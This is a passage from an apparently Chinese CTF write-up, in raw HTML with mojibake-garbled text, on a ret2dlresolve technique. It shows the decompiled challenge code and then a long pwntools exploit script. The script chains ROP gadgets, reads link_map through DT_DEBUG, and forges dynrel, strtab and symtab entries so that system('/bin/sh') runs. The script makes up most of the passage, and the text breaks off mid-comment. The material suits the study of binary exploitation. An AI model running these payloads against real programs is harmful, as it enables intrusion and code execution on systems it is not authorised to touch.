(_dl_exception_create@got.plt) â€”â–¸ 0x7fd64b914050 â—‚â€” endbr64</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>_dl_runtime_resolve_xsave</code>å‡½æ•°å°±åœ¨åç§»ä¸º<code>0x10</code>çš„ä½ç½®äº†ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_40071B();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®çš„ä»£ç å¾ˆç®€å•ï¼Œ<code>main</code>å‡½æ•°å°±åªæœ‰è¿™å‡ è¡Œä»£ç ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•è¾“å‡ºå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_400606</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + (<span class="keyword">int</span>)a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µå‡½æ•°åˆ™æ˜¯åˆšå¥½æ»¡è¶³ç¬¬äºŒä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°ä»»æ„åœ°å€è¯»å–ä¹‹åå†™å…¥åˆ°ä»»æ„åœ°å€ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>å› ä¸ºå‰é¢å·²ç»æåˆ°äº†åˆ©ç”¨åŸç†ï¼Œè¿™é‡Œå°±ä¸å¤šèµ˜è¿°ç›´æ¥ä¸Šexpå§ã€‚</p><p>å› ä¸ºæˆ‘çš„expæ˜¯è¾¹æ‰“è¾¹å†™çš„ï¼Œæ‰€ä»¥å†™å¾—åƒä¸€å¨shitæ‰€ä»¥æˆ‘åœ¨æ¯ä¸€æ­¥éƒ½åŠ äº†æ³¨é‡Šæ–¹ä¾¿ç†è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007e3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004007e1</span></span><br><span class="line">bss = <span class="number">0x601040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400740</span></span><br><span class="line"></span><br><span class="line">gadget_for_read = <span class="number">0x400606</span></span><br><span class="line">gadget_for_write = <span class="number">0x40067C</span></span><br><span class="line">gadget_csu = <span class="number">0x4007DA</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ æˆreadä¸€æ¬¡ä¹‹åè¿”å›åˆ°main</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨å›ºå®šä½ç½®å†™ä¸Šç»è¿‡csuä¹‹åéœ€è¦è·³è½¬çš„å‡½æ•°ä½ç½®</span></span><br><span class="line">r.sendline(flat(bss + <span class="number">0x10</span>, gadget_for_read, <span class="number">0xBEEFDEAD</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡csuè°ƒç”¨åˆ°gadget_for_readï¼Œç›®çš„æ˜¯å°†BEEDDEADè¯»å–åˆ°0x601030</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>, <span class="number">1</span>,</span><br><span class="line">               <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸€æ ·çš„ä¸ºåç»­åšå‡†å¤‡ï¼Œè¿™é‡Œå°†0x601050å’Œ0x601040çš„æŒ‡è®¾ç½®ä¸º(0x600EC0 + 0x8)ä¹Ÿå°±æ˜¯DT_DEBUG</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå°±æ˜¯è¯»å–DT_DEBUGä¸­çš„d_ptrçš„å€¼ï¼Œå¹¶å†™åˆ°0x601040çš„ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®a1ä¸º8ï¼Œè¯»å–r_debugä¸­çš„d_valå€¼(å³ä¸ºlink_map)å¹¶å­˜æ”¾åœ¨0x601040ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®a1ä½-0x54680 + 8ï¼Œè·å¾—link_map-&gt;l_next-&gt;l_next-&gt;l_info[3]çš„å€¼(å³ä¸ºlibcçš„gotè¡¨åœ°å€)å¹¶å­˜æ”¾åœ¨0x601040çš„ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, -<span class="number">0x54680</span> + <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®a1ä¸º0x10ï¼Œè·å¾—_dl_runtime_resolveå‡½æ•°åœ°å€ï¼Œå¹¶å­˜æ”¾åœ¨0x601fd0ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">501</span>, <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œåˆä¸€æ¬¡è¯»å–äº†ä¸€ä¸‹DT_DEBUG + 8çš„å†…å®¹</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œæ˜¯å‘0x601020ä½ç½®å†™å…¥link_mapåœ°å€</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸€æ­¥æ˜¯ä¿®æ”¹link_mapçš„dynrelæŒ‡é’ˆæŒ‡å‘bssæ®µ</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x601028</span>, gadget_for_write, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0x1f</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨bssæ®µçš„å¯¹åº”ä½ç½®å†™ä¸Šfake_dynrel</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x300</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x310</span>).ljust(<span class="number">0x20</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åœ¨fake_dynrelç»“æ„ä½“çš„åç§»ä¸º0x8çš„ä½ç½®åªæƒ³çš„æ˜¯fake_relçš„åœ°å€ï¼Œæ‰€ä»¥è¿˜éœ€è¦åœ¨è¿™é‡Œä¼ªé€ </span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x310</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(bss+<span class="number">0x700</span>, <span class="number">7</span>, <span class="number">0</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥fake strtabå’Œ/bin/sh</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, bss+<span class="number">0x40</span>, <span class="string">b&quot;system\x00&quot;</span>).ljust(<span class="number">0x50</span>,</span><br><span class="line">           <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–link_mapä¸­strtabæŒ‡é’ˆçš„åœ°å€</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x30</span>, <span class="number">0xd</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥fake_symtab</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0</span>, elf.got[<span class="string">&#x27;read&#x27;</span>]-<span class="number">8</span>).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¦†ç›–link_mapä¸­çš„symtabæŒ‡é’ˆçš„å€¼</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               bss+<span class="number">0x100</span>, <span class="number">0xe</span>, -<span class="number">1</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–link_mapåœ°å€åˆ°0x601040ä½ç½®</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi, <span class="number">0</span>, pop_rsi_r15, bss, <span class="number">0</span>, read_plt, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">r.sendline(flat(<span class="number">0x600EC0</span> + <span class="number">0x8</span>, gadget_for_read, <span class="number">0x600EC0</span> + <span class="number">0x8</span>))</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, gadget_csu, <span class="number">0</span>, <span class="number">1</span>, bss + <span class="number">8</span>,</span><br><span class="line">               <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x4007C0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>*<span class="number">7</span>, main_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">bss = bss+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥link_mapåœ°å€ï¼Œå®ç°æ 